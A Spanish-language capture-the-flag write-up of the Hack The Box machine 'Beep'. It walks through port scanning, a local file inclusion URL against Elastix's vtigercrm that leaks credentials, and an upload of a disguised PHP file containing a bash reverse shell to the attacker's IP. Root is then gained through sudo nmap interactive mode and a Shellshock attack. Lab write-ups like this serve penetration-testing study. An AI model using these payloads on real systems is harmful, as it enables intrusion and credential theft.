---
title: Beep Writeup
author: d3vjh
date: 2023-07-19
categories: [Writeup, HTB]
tags: [Linux, CTF, Easy, LFI, Information Leakage, Abusing File Upload, Shellshock Attack]
image: 
  path: /assets/img/commons/Beep/Beep.png
---

# Beep

Una máquina muy antigua, la cual posee varios vectores de ataque para elevar privilegios, en este writeup, se contemplan dos, utilizando una versión antigua de `nmap` y realizando un ShellShock Attack, también contempla vulnerabilidades de Subida de archivos maliciosos, y de fuga de información

## Recopilación de Información

Iniciamos comprobando si tenemos comunicación con la máquina, enviando una traza `ICMP` a la IP `10.10.10.7`

```bash
❯ ping -c 1 10.10.10.7
PING 10.10.10.7 (10.10.10.7) 56(84) bytes of data.
64 bytes from 10.10.10.7: icmp_seq=1 ttl=63 time=101 ms

--- 10.10.10.7 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 101.195/101.195/101.195/0.000 ms
```
{: .nolineno }

Ahora vamos a conocer los puertos que tiene abiertos la máquina, haciendo uso de la herramienta Nmap

```bash
❯ nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.10.7 -oG allPorts
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.93 ( https://nmap.org ) at 2023-07-19 23:52 -05
Initiating SYN Stealth Scan at 23:52
Scanning 10.10.10.7 [65535 ports]
Discovered open port 995/tcp on 10.10.10.7
Discovered open port 25/tcp on 10.10.10.7
Discovered open port 993/tcp on 10.10.10.7
Discovered open port 3306/tcp on 10.10.10.7
Discovered open port 80/tcp on 10.10.10.7
Discovered open port 443/tcp on 10.10.10.7
Discovered open port 110/tcp on 10.10.10.7
Discovered open port 143/tcp on 10.10.10.7
Discovered open port 111/tcp on 10.10.10.7
Discovered open port 22/tcp on 10.10.10.7
Discovered open port 4559/tcp on 10.10.10.7
Discovered open port 4445/tcp on 10.10.10.7
Discovered open port 879/tcp on 10.10.10.7
Discovered open port 10000/tcp on 10.10.10.7
```
{: .nolineno }

Vemos que hay bastantes puertos abiertos, destacamos que hay bastantes en la lista de [puertos bien conocidos](https://jlsmorilloblog.wordpress.com/2018/09/19/listado-de-puertos-bien-conocidos-tcp-udp/)

Vamos a enviar una serie de Scripts por defecto a los puertos anteriormente encontrados, para así conocer que versión y que servicio se están ejecutando

```bash
❯ nmap -p22,25,80,110,111,143,443,879,993,995,3306,4190,4445,4559,5038,10000 -sCV 10.10.10.7 -oN target
Starting Nmap 7.93 ( https://nmap.org ) at 2023-07-19 23:56 -05
Stats: 0:01:11 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
Service scan Timing: About 53.33% done; ETC: 23:58 (0:00:59 remaining)
Nmap scan report for 10.10.10.7
Host is up (0.14s latency).

PORT      STATE    SERVICE          VERSION
22/tcp    open     ssh              OpenSSH 4.3 (protocol 2.0)
| ssh-hostkey: 
|   1024 adee5abb6937fb27afb83072a0f96f53 (DSA)
|_  2048 bcc6735913a18a4b550750f6651d6d0d (RSA)
25/tcp    open     smtp?
|_smtp-commands: beep.localdomain, PIPELINING, SIZE 10240000, VRFY, ETRN, ENHANCEDSTATUSCODES, 8BITMIME, DSN
80/tcp    open     http             Apache httpd 2.2.3
|_http-server-header: Apache/2.2.3 (CentOS)
|_http-title: Did not follow redirect to https://10.10.10.7/
110/tcp   open     pop3?
|_pop3-capabilities: USER EXPIRE(NEVER) AUTH-RESP-CODE UIDL APOP TOP STLS LOGIN-DELAY(0) IMPLEMENTATION(Cyrus POP3 server v2) PIPELINING RESP-CODES
111/tcp   open     rpcbind          2 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2            111/tcp   rpcbind
|   100000  2            111/udp   rpcbind
|   100024  1            876/udp   status
|_  100024  1            879/tcp   status
143/tcp   open     imap             Cyrus imapd 2.3.7-Invoca-RPM-2.3.7-7.el5_6.4
|_imap-capabilities: UNSELECT LISTEXT Completed ACL URLAUTHA0001 UIDPLUS OK ANNOTATEMORE LIST-SUBSCRIBED NAMESPACE IDLE CONDSTORE CATENATE X-NETSCAPE THREAD=REFERENCES QUOTA THREAD=ORDEREDSUBJECT ID CHILDREN LITERAL+ MAILBOX-REFERRALS SORT BINARY SORT=MODSEQ MULTIAPPEND IMAP4 RIGHTS=kxte STARTTLS ATOMIC RENAME NO IMAP4rev1
443/tcp   open     ssl/https?
| ssl-cert: Subject: commonName=localhost.localdomain/organizationName=SomeOrganization/stateOrProvinceName=SomeState/countryName=--
| Not valid before: 2017-04-07T08:22:08
|_Not valid after:  2018-04-07T08:22:08
|_ssl-date: 2023-07-20T05:00:16+00:00; -8s from scanner time.
879/tcp   open     status           1 (RPC #100024)
993/tcp   open     imaps?
|_imap-capabilities: CAPABILITY
995/tcp   open     pop3s?
3306/tcp  open     mysql?
4190/tcp  open     sieve?
4445/tcp  open     upnotifyp?
4559/tcp  open     hylafax          HylaFAX 4.3.10
5038/tcp  open     asterisk         Asterisk Call Manager 1.1
10000/tcp filtered snet-sensor-mgmt
Service Info: Hosts: 127.0.0.1, example.com, localhost; OS: Unix

Host script results:
|_clock-skew: -8s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 423.95 seconds
```
{: .nolineno }

## Análisis de Vulnerabilidades

![Elastix Login](/assets/img/commons/Beep/ElastixLogin.png)_Elastix Login_


Intentamos buscar exploits que afecten este servicio, y encontramos en [searchsploit](https://d3vjh.github.io/quickTools/#searchsploit) lo siguiente:

```bash
❯ searchsploit elastix
-------------------------------------------------------------------- ------------------------
 Exploit Title                                                      |  Path
-------------------------------------------------------------------- ------------------------
Elastix - 'page' Cross-Site Scripting                               | php/webapps/38078.py
Elastix - Multiple Cross-Site Scripting Vulnerabilities             | php/webapps/38544.txt
Elastix 2.0.2 - Multiple Cross-Site Scripting Vulnerabilities       | php/webapps/34942.txt
Elastix 2.2.0 - 'graph.php' Local File Inclusion ✅               | php/webapps/37637.pl ✅
Elastix 2.x - Blind SQL Injection                                   | php/webapps/36305.txt
Elastix < 2.5 - PHP Code Injection                                  | php/webapps/38091.php
FreePBX 2.10.0 / Elastix 2.2.0 - Remote Code Execution              | php/webapps/18650.py
-------------------------------------------------------------------- -------------------------
Shellcodes: No Results
```
{: .nolineno }

Para indagar un poco más en el script, se ejecuta el siguiente comando

```bash
❯ searchsploit -x php/webapps/37637.pl
  Exploit: Elastix 2.2.0 - 'graph.php' Local File Inclusion
      URL: https://www.exploit-db.com/exploits/37637
     Path: /usr/share/exploitdb/exploits/php/webapps/37637.pl
    Codes: N/A
 Verified: True
File Type: ASCII text
```
{: .nolineno }

Dentro de este script en `Perl`, nos indica que existe un directorio vulnerable

```perl
LFI Exploit: /vtigercrm/graph.php?current_language=../../../../../../../..//etc/amportal.conf%00&module=Accounts&action
```
Y podemos ver el archivo `amportal.conf`

![amportal.conf](/assets/img/commons/Beep/Amportal.conf.png)_Amportal.conf_

### Local File Inclusion (LFI)

Es decir, tenemos capacidad de Directory Listing

![/etc/passwd](/assets/img/commons/Beep/etcpasswd.png)_/etc/passwd_

### Information Leakage

Indagando, vemos en el archivo `Amportal.conf`, unas credenciales, que vamos a probar en `vtigercrm`

![VTiger CRM Login](/assets/img/commons/Beep/vtigercrmLogin.png)_VTiger CRM Login With Credentials_

E ingresamos a la página

![VTiger CRM Logged](/assets/img/commons/Beep/vtigercrmLogged.png)_VTiger CRM Logged_

## Explotación de Vulnerabilidades

### Abusing File Upload

Indagando un poco dentro de los paneles, podemos ver que tenemos la capacidad de subir una imagen como logo de la compañia

![VTiger Image Upload](/assets/img/commons/Beep/vtigerImage.png)_VTiger Image Upload_

Podemos aprovechar que la página es construida en `php` lo que nos hace pensar que es posible que interprete este código al ser inyectado de manera maliciosa por lo que vamos a crear el archivo `cmd.php.jpg` ya que solo se permite la subida de archivos con extensión `.jpg`

```bash
* File cmd.php.jpg

<?php
  system("bash -c 'bash -i >& /dev/tcp/10.10.14.51/443 0>&1'");
?>
```
En el cual estamos usando un `One Liner` que nos envia una `bash` al puerto `443`

![VTiger Evil Image Upload](/assets/img/commons/Beep/vtigerimageevil.png)_VTiger Evil Image Upload_

Y en efecto, tenemos acceso a la máquina como el usuario `aesterisk`, podemos comprobar que estamos en la máquina, al hacer un `ifconfig` y nos devuelva la `ip` que estamos atacando

![User Acess](/assets/img/commons/Beep/useracess.png)_User Acess_

## Post Explotación 


Para elevar privilegios, hay varios vectores de ataque que podemos considerar, pero uno de los más interesantes es el de `nmap`

```bash
bash-3.2$ sudo -l
Matching Defaults entries for asterisk on this host:
    env_reset, env_keep="COLORS DISPLAY HOSTNAME HISTSIZE INPUTRC KDEDIR LS_COLORS MAIL PS1 PS2 QTDIR USERNAME LANG LC_ADDRESS LC_CTYPE LC_COLLATE LC_IDENTIFICATION LC_MEASUREMENT
    LC_MESSAGES LC_MONETARY LC_NAME LC_NUMERIC LC_PAPER LC_TELEPHONE LC_TIME LC_ALL LANGUAGE LINGUAS _XKB_CHARSET XAUTHORITY"

User asterisk may run the following commands on this host:
    (root) NOPASSWD: /sbin/shutdown
    (root) NOPASSWD: /usr/bin/nmap
    (root) NOPASSWD: /usr/bin/yum
    (root) NOPASSWD: /bin/touch
    (root) NOPASSWD: /bin/chmod
    (root) NOPASSWD: /bin/chown
    (root) NOPASSWD: /sbin/service
    (root) NOPASSWD: /sbin/init
    (root) NOPASSWD: /usr/sbin/postmap
    (root) NOPASSWD: /usr/sbin/postfix
    (root) NOPASSWD: /usr/sbin/saslpasswd2
    (root) NOPASSWD: /usr/sbin/hardware_detector
    (root) NOPASSWD: /sbin/chkconfig
    (root) NOPASSWD: /usr/sbin/elastix-helper
bash-3.2$
```
{: .nolineno }

La lanzamos en modo `interactive` lo cual solo es posible en versiones antiguas de nmap, y así mismo, lanzamos una bash con `!sh` y nos la entrega como `root`

```bash
bash-3.2$ sudo nmap --interactive

Starting Nmap V. 4.11 ( http://www.insecure.org/nmap/ )
Welcome to Interactive Mode -- press h <enter> for help
nmap> !sh
sh-3.2# whoami
root
```

### ShellShock


Extiste una manera más interesante para elevar nuestros privilegios, y es realizando un [ShellShock Attack](https://deephacking.tech/shellshock-attack-pentesting-web/).
En principio y de manera resumida, debemos cambiar el `User-Agent` de la petición, la cual permite realizar un `RCE` la cual vamos a utilizar para mandarnos una `bash` al puerto `4646`, Utilizando la herramienta de `Burpsuite` se debe ver algo así

![Burpsuite ShellShock Attack](/assets/img/commons/Beep/Burpsuite.png)_Burpsuite ShellShock Attack_

A su vez nos ponemos en escucha por el puerto `4646` haciendo uso de la herramienta `nc` y obtenemos la `Bash`


![Root ShellShock Attack](/assets/img/commons/Beep/root.png)_Root ShellShock Attack_

Y así Finalizamos la máquina


![Beep Pwned](/assets/img/commons/Beep/BeepPwned.png)_Beep Pwned!_

